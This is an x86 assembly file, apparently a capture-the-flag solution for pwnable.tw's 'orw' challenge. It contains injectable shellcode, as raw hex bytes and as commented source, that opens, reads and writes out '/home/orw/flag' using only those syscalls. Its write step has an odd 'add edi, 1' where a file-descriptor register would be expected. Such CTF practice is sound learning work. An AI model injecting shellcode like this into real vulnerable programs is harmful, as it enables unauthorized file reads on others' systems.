    ; Resolution of the Orw challenge from  https://pwnable.tw/ : Only open read write syscall are allowed to use. 
    ; This is a shell code I have developed to resolve the challenge.
    ; Final shell code:
    ; "\xB8\x05\x00\x00\x00\x68\x61\x67\x00\x00\x68\x77\x2F\x66\x6C\x68\x65\x2F\x6F\x72\x68\x2F\x68\x6F\x6D\x89\xE3\xB9\x00\x00\x00\x00\xBA\xA4\x01\x00\x00\xCD\x80\x89\xC3\xB8\x03\x00\x00\x00\x8D\x0C\x24\xBA\xFF\xFF\xFF\x00\xCD\x80\x31\xDB\x83\xC7\x01\x89\xC2\xB8\x04\x00\x00\x00\xCD\x80\xB8\x01\x00\x00\x00\xBB\x00\x00\x00\x00\xCD\x80"


    ;open syscall
    mov eax, 0x05
    ; /home/orw/flag
    push 0x00006761
    push 0x6c662f77
    push 0x726f2f65
    push 0x6d6f682f
    mov ebx, esp
    mov ecx, 0x00
    mov edx, 0644
    int 0x80


    ;read syscall
    mov ebx, eax
    mov eax, 0x03
    lea ecx, [esp]
    mov edx, 0xffffff
    int 0x80


    ;write syscall
    xor ebx, ebx
    add edi, 1
    mov edx, eax
    mov eax, 0x04
    int 0x80

    mov eax, 0x01
    mov ebx, 0x00
    int 0x80
